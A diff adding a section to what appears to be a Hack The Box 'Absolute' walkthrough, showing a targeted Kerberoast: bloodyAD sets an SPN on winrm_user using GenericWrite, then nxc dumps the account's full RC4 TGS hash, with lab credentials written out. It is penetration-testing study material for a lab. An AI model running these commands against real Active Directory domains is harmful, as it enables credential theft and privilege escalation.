@@ -544,5 +544,22 @@ So now im part of the `network audit` group i can abuse GenericWrite
 
 Ill start by trying a targeted kerberoast
 
+```python
+faketime -f +7h bloodyAD --host dc.absolute.htb -d absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k set object 'winrm_user' servicePrincipalName -v 'service/hacked'
+[+] winrm_user's servicePrincipalName has been updated
+```
 
+First ill add an SPN
+
+```python
+faketime -f +7h nxc ldap dc.absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k --kerberoasting winrmuser.hash                                
+LDAP        dc.absolute.htb 389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb) (signing:None) (channel binding:Never) 
+LDAP        dc.absolute.htb 389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
+LDAP        dc.absolute.htb 389    DC               [*] Skipping disabled account: krbtgt
+LDAP        dc.absolute.htb 389    DC               [*] Total of records returned 1
+LDAP        dc.absolute.htb 389    DC               [*] sAMAccountName: winrm_user, memberOf: ['CN=Protected Users,CN=Users,DC=absolute,DC=htb', 'CN=Remote Management Users,CN=Builtin,DC=absolute,DC=htb'], pwdLastSet: 2022-06-09 09:25:51.537539, lastLogon: 2022-06-09 15:13:12.045465
+LDAP        dc.absolute.htb 389    DC               $krb5tgs$23$*winrm_user$ABSOLUTE.HTB$absolute.htb\winrm_user*$7c5c5204da7d13dc9244a3847d3d11a1$80c933697e00a65ace83098f3f59834d350a11ce03b26f9e1034a03d782ce7d643135ae522beaa54a5e3049793ba21f9ef6008be3c1ef564cee9a54a4a08977af661475744c838c9153a41f3b5005f25515806983efea8f332bb781be8b6ab40dd6adcd5c29ea34ad41fb89fe360538225e406ddd410e2704ff77ab812221d0bd6ec034c35708e27738afe0d5e7b07480c4bb6066fe34c94d87e48c21112fca78df49e63112fffe01bf196ec748b204133417c3b4a44984d44c1d05c8bd79f740d6fd8112a73404d1470bbc33032a31351307193dacf2361819878b32b07c9da13f972499878b1f8a8a44e83ddba664eb485cdf665194b9a3ee9ca9f12621c20675287eea040b475dc9c19399a80d7c0da3bb94abea5c6b5a74ca8bf9c1e2ef17e3b6cd5f9f5997ba760819f8a3932abceaa4665216320a006686f6bb6946f96d4d68f1f34fe3d62296ef62129f44d7234bff0ea2682e4b4da59a704021325a4965a1c743bf2a501be2c95f8efcd1471a5504ccab6702dbf7eae0f85399573164515a43cc029ad83aa06422101fa49a81e6a706f9942a8c61d6ee8f0187c4baa29df803b69922cecf9e855797d7898c29f594ef7888aae58e8ae4e30d577f15959e7da0bae815ce4edb3ce0feeede5dc95362206b5ee9841ebbb10d892dd3bb42ff2c403776cf93c06f47ef879e78fbbb1fa2ffe42bfc15e88afbf1a6a59b4eafaf59ff9e2b9b6df877fb1f88379df2ade7bf354b4504d33dfdba5eadd57cd7988a62371a41bc5068ec2344337f81672491890591d57a2772a3a5ce3841ba2ab1d10de23f320d16242d1f2af299776154aef57b3c1b75d35a4bd08254f492f64d536f9916d2f26838e4f6cbf24061030c4bc4e0a40d050ad0fb82f75ff9d4c1f55993a40f019e3a7c0e623a6e6d82b63c698e3dd1f244eaf06e187d09f8bf98ccf8abc5ed0a919a72e911e22e55e3feadb811ecb76a9d28f306d936597473cf2c46e53ef9ac1189e4c9f725ead66db32c559051d5363d8d03234e47888e5a5c3122afa028d2c376a2f4a70972fce65ba324ef98f9f5ac2ca46140671636925a7be57bf5e69781f9fcfdb32509f776b8aeaea832786764bf4c5ba18b6c71f4af97ddc9a89d28e0a518ef2b7ea64acfdaaaa7a1f33fa5325f588db708c1e95ce2ae275733867d2f4fc2293f9ca849f566b52f64d8a1a69b5c6d44bed4a0271e4855fe77c4e85e6711bf3f14dc5135ae7a66f35496a29e55a6a41e8251191c1170d6810185a625fbe5c1754f595e7c90bb982701f9c77128215ed8c858c2c790eb38de6d138eabc1941f53b051d2e554fa4da81999955694938be1084d45a02056c5cc49912d7f15759e6cae05b0b49d8d8197724e79c31f58626793317d7c3fa324576e4e28bc4cce4b627cfde5799dbaedc93d3b8ae56fe10c8572dceb81694af81710cd19b1c87f86a56a48b0654
+```
+
+Now ill dump the hash, once again E type 23, so thats RC4
 
